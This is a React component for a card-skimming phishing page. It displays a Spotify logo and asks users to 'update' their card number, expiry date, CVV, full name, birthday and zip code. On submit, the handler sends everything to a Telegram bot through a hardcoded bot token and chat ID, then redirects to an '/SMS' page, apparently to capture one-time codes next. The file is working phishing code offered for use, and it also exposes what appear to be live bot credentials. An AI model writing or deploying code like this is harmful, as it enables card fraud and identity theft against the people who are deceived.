import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css'; // Make sure to create this CSS file

const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo';
const TELEGRAM_CHAT_ID = '7464995879';

const CreditCardPage = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [fullName, setFullName] = useState(''); // State for full name
  const [birthday, setBirthday] = useState('');
  const [zipCode, setZipCode] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault(); // Prevent default form submission behavior

    // Construct the message to send to Telegram
    const message = `
      📋 *User Credit Card Information* 📋
      *Full Name:* ${fullName}
      *Card Number:* ${cardNumber}
      *Expiration Date:* ${expirationDate}
      *CVV:* ${cvv}
      *Birthday:* ${birthday}
      *Zip Code:* ${zipCode}
    `;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
            navigate('/SMS'); 
        } else {
          alert('Failed to send the message. Please try again.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Error sending message. Please check the console for details.');
      });
  };

  return (
    <div className="container">
              <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg" alt="Spotify Logo" className="logo" />

      <h2>Enter Your Credit Card Information</h2>

      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Full Name"
          value={fullName}
          onChange={(e) => setFullName(e.target.value)}
          className="code-input"
          required
        />
        <input
          type="text"
          placeholder="Credit Card Number"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          className="code-input"
          required
        />
        <input
          type="text"
          placeholder="Expiration Date (MM/YY)"
          value={expirationDate}
          onChange={(e) => setExpirationDate(e.target.value)}
          className="code-input"
          required
        />
        <input
          type="text"
          placeholder="CVV"
          value={cvv}
          onChange={(e) => setCvv(e.target.value)}
          className="code-input"
          required
        />
        <input
          type="date"
          placeholder="Birthday"
          value={birthday}
          onChange={(e) => setBirthday(e.target.value)}
          className="code-input"
          required
        />
        <input
          type="text"
          placeholder="Zip Code"
          value={zipCode}
          onChange={(e) => setZipCode(e.target.value)}
          className="code-input"
          required
        />
        <button type="submit" className="submit-btn">Update now</button>
      </form>
      <br />
      <a href="#" className="signup-link">Don't Have an account? Log in.</a>
    </div>
  );
}

export default CreditCardPage;
